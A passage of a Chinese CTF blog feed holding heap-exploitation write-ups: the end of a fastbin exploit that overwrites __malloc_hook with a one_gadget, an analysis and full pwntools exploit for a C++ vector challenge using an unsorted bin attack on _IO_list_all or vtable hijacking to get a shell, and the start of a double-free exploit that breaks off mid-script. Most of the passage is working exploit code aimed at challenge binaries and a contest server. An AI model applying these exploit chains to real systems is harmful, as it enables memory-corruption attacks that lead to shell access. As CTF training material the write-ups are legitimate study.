punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x603285</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">11</span><span class="token operator">*</span><span class="token string">"c"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x603370</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak libc &amp; make fastbin attack</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>editPassword<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x60</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6032f0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"STUDENT: "</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_offset <span class="token operator">=</span> data <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_offset<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">1</span><span class="token punctuation">)</span>target_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_offset<span class="token number">-0x23</span><span class="token comment" spellcheck="true"># # modify  position fake chunk's fd pointer T position chunk</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>editPassword<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token string">"\x77"</span><span class="token operator">*</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span><span class="token comment" spellcheck="true">## write one_gadget</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>editPassword<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> one_gadgets<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_offset<span class="token comment" spellcheck="true"># edit(11*"\x00"+p64(one_gadget)+p64(libc.symbols['realloc']+libc_offset+13)+(0x60-7-0x13)*"\x00")</span>edit<span class="token punctuation">(</span><span class="token number">19</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">0x60</span><span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span><span class="token number">0x13</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>editPassword<span class="token punctuation">(</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x8f</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><h2 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/c-pwn-chu-tan-yi/4.png"></div>PIE没开启，got表可劫持，其实第一反应就是unlink攻击。libc 2.23<h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>其实这道题目有提示：要熟悉C++的vector机制，于是专门上网查了些资料学习了下vector的分配机制。这道题大概是模拟了vector的这个机制，当分配的时候查看size是否不够，再根据之前的size来重新分配大的size。0x20、0x30、0x50、0x90、0x110….<br>以此类推。</p><p>功能说明：</p><p><strong>create</strong>：不够的时候按照vector规定机制继续分配，没有漏洞。</p><p><strong>show</strong>：整个过程是malloc free edit。漏洞点在于start heap地址没有及时更新，仍然是释放的那个chunk地址。</p><p>既可以溢出下一个chunk，同时还可以对上一个删除后的chunk进行UAF，也就是说当一个chunk为0x50的时候，这时候show的时候可以编辑，当编辑的内容超出原size的时候就会重新分配chunk，与此同时，写信息可以从原来的chunk开始写，一直向下溢出，溢出的size到分配的那个chunk的一半。系统默认所有的chunk都是连在一起的。看起来好像是个很大的洞，但是，利用条件十分苛刻，跟xmzyshypnc师傅看了一下午想到不少思路还是没能解决。</p><p><strong>delete</strong>：使用delete的时候，如果最后一个临近top chunk的chunk size大于fastbin，那么将会触发malloc_consolidation。合并所有chunk，但是数据不会被清空。</p><p>IDA程序比较麻烦并且都去掉了符号表，很难逆向其实逆到后面确实如自己所想确实少看到了一个条件，对出现异常的原因不清晰。</p><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><pre class="line-numbers language-c++"><code class="language-c++">//_Alloc 表示内存分配器，此参数几乎不需要我们关心template <class _Ty, class _Alloc = allocator<_Ty>>class vector{...    protected:        pointer _Myfirst;        pointer _Mylast;        pointer _Myend;};<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>_Myfirst 指向的是 vector 容器对象的起始字节位置；_Mylast 指向当前最后一个元素的末尾字节；_myend 指向整个 vector 容器所占用内存空间的末尾字节。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/c-pwn-chu-tan-yi/5.png"></div><p>一个已容纳 2 个元素，容量为 5 的 vector 容器。</p><p>当 vector 的大小和容量相等（size==capacity）也就是满载时，如果再向其添加元素，那么 vector 就需要扩容。vector 容器扩容的过程需要经历以下 3 步：</p><ol><li>完全弃用现有的内存空间，重新申请更大的内存空间；</li><li>将旧内存空间中的数据，按原有顺序移动到新的内存空间中；</li><li>最后将旧的内存空间释放。</li></ol><p>在VS 下，扩容都是以 1.5 倍扩大，但是，在 gcc 编译环境下，是以 2 倍的方式扩容</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>和xmzyshypnc师傅一起想了这么几个思路：</p><ul><li><p>第一个fastbin attack攻击，由于size 链不满足getshell或者劫持bss上的要求，所以就失败了。</p></li><li><p>第二个unsorted bin attack改掉bss上start heap地址，相当于首地址改到最大，不会令first和end想同，也就不会继续分配chunk了，于此同时还可以继续向main_arena编辑，一直到malloc_hook。但是最后成功改掉了bss上first的heap地址，但程序执行到后面会报错。</p></li><li><p>第三个改io_write_end，这样就可以一直向下编辑，但是到最后会由于_wide_data处被修改而一直无限循环。</p></li></ul><p>最后可行的思路1：unsorted bin attack改io_file_list_all为main_arena，最后在chain处准备0x60的chunk，伪造io_file和vtable即可完成攻击。</p><p>可行思路2：通过学习writeup发现这道题还可以改虚表来getshell：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/07/c-pwn-chu-tan-yi/6.png"></div>bss段会看到有指针指向cin、cout的虚表，利用unsorted bin attack改掉指针指向地址，虚表为heap地址，heap地址内是布置好的one_gadget<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>debug <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims              <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn1"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn1"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.23.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"117.51.143.25"</span><span class="token punctuation">,</span><span class="token number">5005</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn1"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.23.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>num<span class="token operator">=</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"num:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># def show(choice)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">chooseY</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"(y/n):"</span><span class="token punctuation">,</span><span class="token string">"y"</span><span class="token punctuation">)</span>    sl<span class="token punctuation">(</span>str<span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">chooseN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"(y/n):"</span><span class="token punctuation">,</span><span class="token string">"n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"1:"</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x617c10</span><span class="token operator">+</span><span class="token number">0x606000</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    chooseN<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>chooseN<span class="token punctuation">(</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"2:"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x7ffff7475000</span><span class="token operator">-</span><span class="token number">0x7ffff7839b78</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>chooseN<span class="token punctuation">(</span><span class="token punctuation">)</span>chooseN<span class="token punctuation">(</span><span class="token punctuation">)</span>chooseN<span class="token punctuation">(</span><span class="token punctuation">)</span>chooseN<span class="token punctuation">(</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    chooseY<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>chooseY<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>chooseY<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    chooseY<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># large overflow</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0x11111111</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">">>"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    chooseN<span class="token punctuation">(</span><span class="token punctuation">)</span>chooseY<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0x0068732f6e69622f</span><span class="token punctuation">)</span><span class="token punctuation">)</span>chooseY<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span>chooseN<span class="token punctuation">(</span><span class="token punctuation">)</span>chooseY<span class="token punctuation">(</span>str<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_list_all'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>chooseY<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>chooseY<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    chooseY<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>chooseY<span class="token punctuation">(</span>heap_addr<span class="token operator">+</span><span class="token number">0x617d40</span><span class="token operator">-</span><span class="token number">0x606000</span><span class="token operator">+</span><span class="token number">0x40</span><span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    chooseY<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    chooseY<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    chooseN<span class="token punctuation">(</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x22222222</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x22222222</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x22222222</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x20000000</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 补充知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ PWN初探 </tag>
            
            <tag> unsorted bin attack </tag>
            
            <tag> IO attack </tag>
            
            <tag> fastbin attack </tag>
            
            <tag> 虚表劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019-XMAN冬令营结营赛</title>
      <link href="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/"/>
      <url>/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/</url>
      
        <content type="html"><![CDATA[<h1 id="filesystem"><a href="#filesystem" class="headerlink" title="filesystem"></a>filesystem</h1><h2 id="0x01-查看文件"><a href="#0x01-查看文件" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/0.png"></div><h2 id="0x02-IDA分析"><a href="#0x02-IDA分析" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/1.png"></div>它这里只是清空了size的部分，而chunk address的地址没有清空，double free<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/2.png"></div><h2 id="0x03-思路"><a href="#0x03-思路" class="headerlink" title="0x03 思路"></a>0x03 思路</h2><p>首先劫持chunk list，劫持之后先puts出libc的基址，然后改free函数的地址为system函数的地址，最后释放一个带有/bin/sh字符串的chunk就可以达到getshell的目的</p><h2 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># p = remote("139.9.103.173",2333)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'flagsystem'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./flagsystem'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'your choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'team\'s flag:\n'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'the flag:\n'</span><span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'your choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'to delete:\n'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'your choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'to edit:\n'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token 